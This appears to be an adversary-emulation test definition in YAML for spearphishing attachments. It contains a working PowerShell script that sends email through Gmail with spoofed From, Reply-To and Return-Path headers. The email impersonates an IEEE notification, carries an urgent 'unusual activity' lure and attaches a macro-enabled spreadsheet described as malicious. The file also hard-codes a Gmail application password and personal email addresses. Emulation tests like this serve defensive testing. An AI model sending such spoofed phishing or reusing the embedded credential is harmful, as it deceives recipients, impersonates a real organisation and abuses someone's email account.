attack_technique: T1566.001
display_name: 'Phishing: Spearphishing Attachment'
atomic_tests:
  - name: Simulate sending a phishing email with a malicious attachment via SMTP with spoofed headers
    auto_generated_guid: custom-guid-phishing-attachment
    description: |
      This test simulates sending a phishing email with a malicious attachment by spoofing headers instead of the From field.
      WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
    supported_platforms:
      - windows
    input_arguments:
      smtp_server:
        description: SMTP server to use
        type: string
        default: "smtp.gmail.com"  # Use Gmail's SMTP server for testing
      smtp_port:
        description: SMTP port
        type: integer
        default: 587  # Use port 587 for TLS
      sender_email:
        description: Real email address for SMTP authentication (Return-Path)
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Replace with your domain for Return-Path
      sender_visible_email:
        description: Email address to spoof in the "From" header
        type: string
        default: "IEEE Notification <chaymabouattour@ieee.org>"  # Spoofed email address
      reply_to_email:
        description: Reply-To email address
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Falsified Reply-To and Return-Path
      recipient_email:
        description: Recipient email address
        type: string
        default: "oumaymakabadou2@gmail.com"  # Replace with the actual recipient's email address
      subject:
        description: Customized subject of the email
        type: string
        default: "Urgent: Please review the attached document"
      body:
        description: Customized body content of the email
        type: string
        default: |
          Dear User,<br>
          We have detected unusual activity on your account. To secure your data, please review the attached document as soon as possible.<br>
          Thank you for your cooperation.<br>
          Best regards,<br>
          The Security Team
      attachment_path:
        description: Path to the malicious attachment
        type: string
        default: "C:\\temp\\PhishingAttachement.xlsm"  # Ensure this matches the actual path
      app_password:
        description: Application password for SMTP authentication
        type: string
        default: "wbae yozc iyut rykk"  # Application password generated for Gmail
      log_file:
        description: Path to the log file
        type: string
        default: "C:\\Users\\chaym\\phishing_script.log"  # Path for logging the result
    executor:
      name: powershell
      elevation_required: false
      command: |
        $smtpServer = "#{smtp_server}"
        $smtpPort = #{smtp_port}
        $senderEmail = "#{sender_email}"  # Real address for SMTP authentication (Return-Path)
        $senderVisibleEmail = "#{sender_visible_email}"  # Address visible in the "From" field
        $replyToEmail = "#{reply_to_email}"  # Reply-To email address
        $recipientEmail = "#{recipient_email}"
        $subject = "#{subject}"
        $body = "#{body}"
        $attachmentPath = "#{attachment_path}"
        $appPassword = "#{app_password}"

        # Create a MailMessage object
        $mailMessage = New-Object System.Net.Mail.MailMessage
        $mailMessage.From = New-Object System.Net.Mail.MailAddress($senderEmail)  # Real From address
        $mailMessage.To.Add($recipientEmail)
        $mailMessage.Subject = $subject
        $mailMessage.Body = $body
        $mailMessage.IsBodyHtml = $true

        # Add custom headers for spoofing
        $mailMessage.Headers.Add("From", $senderVisibleEmail)  # Spoofed From header
        $mailMessage.Headers.Add("Reply-To", $replyToEmail)
        $mailMessage.Headers.Add("Return-Path", $replyToEmail)  # Falsified Return-Path
        $mailMessage.Headers.Add("X-Priority", "1")
        $mailMessage.Headers.Add("X-MSMail-Priority", "High")
        $mailMessage.Headers.Add("Importance", "High")

        # Add attachment
        if (Test-Path $attachmentPath) {
            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
            $mailMessage.Attachments.Add($attachment)
        } else {
            Write-Host "❌ Attachment file not found: $attachmentPath"
            exit 1
        }

        # Configure SMTP client
        $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
        $smtpClient.EnableSsl = $true  # Enable SSL for Gmail
        $smtpClient.Credentials = New-Object System.Management.Automation.PSCredential($senderEmail, $appPassword)

        # Send the email
        try {
            $smtpClient.Send($mailMessage)
            Write-Host "✅ Email sent successfully."
            
            # Log the result
            $logEntry = "Email sent to $recipientEmail successfully at $(Get-Date)"
            Add-Content -Path "#{log_file}" -Value $logEntry
        } catch {
            Write-Host "❌ Error sending email: $_"
            exit 1
        } finally {
            if ($attachment -ne $null) {
                $attachment.Dispose()
            }
        }
